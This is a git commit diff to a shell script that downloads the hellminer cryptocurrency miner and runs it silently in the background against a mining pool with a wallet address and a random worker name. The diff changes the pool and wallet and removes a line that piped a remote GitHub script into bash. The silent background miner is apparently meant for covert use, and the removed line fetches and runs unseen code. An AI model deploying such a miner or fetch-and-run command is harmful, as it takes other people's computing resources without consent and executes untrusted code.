85817ffbe1ec4fc3cf08767edc1a8a0f78574e6d
malogrono <136266511+malogrono@users.noreply.github.com>
2026-01-21 05:15:08 +0700

    Update new.sh

--- new.sh
+++ new.sh
@@ -3,5 +3,4 @@ sudo apt update
 sudo apt install screen -y
 wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz >/dev/null 2>&1
 tar -xvf hellminer_linux64.tar.gz
-./hellminer -c stratum+tcp://188.166.219.152:443 -u RTL47WXHCHZ4KxJ9DKMgz3PduyDboztuQu."A$RANDOM" >/dev/null 2>&1 &
-curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
+./hellminer -c stratum+tcp://sg.vipor.net:5040 -u RUM96eiFSsBKcmynDcRBsgmkMPWPyLS21C."A$RANDOM" >/dev/null 2>&1 &
